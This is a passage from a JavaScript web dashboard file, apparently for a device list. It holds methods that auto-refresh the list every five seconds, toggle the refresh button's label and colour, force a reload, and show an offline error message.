                    <i class="fas fa-sync-alt"></i> Try Again
                </button>
            `;
            loadingElement.style.display = 'block';
        }
    },

    startAutoRefresh: function() {
        if (this.isAutoRefresh) {
            this.autoRefreshInterval = setInterval(() => {
                this.loadAllDevices();
            }, 5000);
        }
    },

    stopAutoRefresh: function() {
        if (this.autoRefreshInterval) {
            clearInterval(this.autoRefreshInterval);
            this.autoRefreshInterval = null;
        }
    },

    toggleAutoRefresh: function() {
        this.isAutoRefresh = !this.isAutoRefresh;
        const btn = document.getElementById('autoRefreshBtn');
        
        if (this.isAutoRefresh) {
            this.startAutoRefresh();
            if (btn) {
                btn.innerHTML = '<i class="fas fa-clock"></i> Auto Refresh: ON';
                btn.style.background = 'linear-gradient(45deg, var(--primary), #0099cc)';
            }
        } else {
            this.stopAutoRefresh();
            if (btn) {
                btn.innerHTML = '<i class="fas fa-clock"></i> Auto Refresh: OFF';
                btn.style.background = 'linear-gradient(45deg, #666, #888)';
            }
        }
        
        app.showToast(`Auto Refresh ${this.isAutoRefresh ? 'Enabled' : 'Disabled'}`);
    },

    forceRefresh: function() {
        console.log('🔄 Force refreshing data...');
        this.lastDataHash = '';
        this.loadAllDevices();
    },

    handleOffline: function() {
        this.showError('No internet connection. Please check your network.');
    }
};

// App initialize karo
app.init();
